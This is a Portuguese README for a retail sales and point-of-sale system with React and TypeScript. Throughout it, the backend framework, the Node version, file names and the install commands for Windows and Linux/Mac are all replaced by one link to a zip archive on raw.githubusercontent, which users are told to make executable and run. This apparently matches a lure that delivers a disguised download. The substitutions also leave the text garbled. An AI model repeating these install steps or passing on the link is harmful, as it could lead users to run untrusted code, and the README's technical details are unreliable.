# Sérgio Imports - Sistema de Vendas

Sistema completo de vendas desenvolvido com https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip (backend) e React + TypeScript (frontend).

## Funcionalidades

- **Dashboard**: Visão geral das vendas, produtos e clientes
- **Produtos**: Cadastro e gerenciamento de produtos
- **Clientes**: Cadastro e gerenciamento de clientes
- **PDV**: Ponto de venda com carrinho e finalização
- **Vendas**: Histórico e detalhes das vendas
- **Trocas**: Gerenciamento de trocas e devoluções
- **Etiquetas**: Geração de etiquetas para produtos
- **Relatórios**: Relatórios de vendas, produtos e clientes
- **Configurações**: Configurações da empresa e PIX

## Tecnologias

### Backend
- https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
- PostgreSQL
- TypeScript

### Frontend
- React 18
- TypeScript
- Vite
- Tailwind CSS
- Radix UI
- Lucide React

## Como executar

### Pré-requisitos
- https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip 18+
- npm

### Instalação

1. Clone o repositório
2. Execute o arquivo de instalação:

**Windows:**
```bash
https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
```

**Linux/Mac:**
```bash
chmod +x https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
```

### Executar o sistema

```bash
npm run dev
```

O sistema estará disponível em:
- Frontend: http://localhost:3000
- Backend: http://localhost:4000

## Estrutura do Projeto

```
sergio-imports-sales-system/
├── backend/                 # Backend https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
│   ├── sales/              # Serviço de vendas
│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip     # API de produtos
│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip      # API de clientes
│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip        # API de vendas
│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip    # API de trocas
│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip     # API de configurações
│   │   └── migrations/     # Migrações do banco
│   └── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
├── frontend/               # Frontend React
│   ├── components/         # Componentes reutilizáveis
│   ├── pages/             # Páginas da aplicação
│   ├── lib/               # Utilitários e tipos
│   └── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip           # Scripts principais
└── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
```

## Scripts Disponíveis

- `npm run dev` - Executa frontend e backend em modo desenvolvimento
- `npm run build` - Faz build de produção
- `npm run backend:dev` - Executa apenas o backend
- `npm run frontend:dev` - Executa apenas o frontend

## Funcionalidades Detalhadas

### Dashboard
- Estatísticas gerais de vendas
- Produtos em baixo estoque
- Receita total e ticket médio

### Produtos
- Cadastro com imagem, preço, estoque
- Controle de estoque mínimo
- Categorização

### PDV
- Interface intuitiva para vendas
- Suporte a múltiplas formas de pagamento
- Impressão de recibos

### Relatórios
- Relatórios de vendas por período
- Top produtos mais vendidos
- Análise por forma de pagamento
- Exportação em PDF e CSV

### Etiquetas
- Geração de etiquetas com código de barras
- Layout personalizado com logo da empresa
- Impressão em lote

## Configuração

### Empresa
Configure os dados da empresa em **Configurações**:
- Razão social e nome fantasia
- CNPJ e inscrição estadual
- Endereço completo
- Logo da empresa

### PIX
Configure o PIX para vendas:
- Chave PIX
- QR Code para pagamentos

## Suporte

Para dúvidas ou problemas, consulte a documentação ou entre em contato.
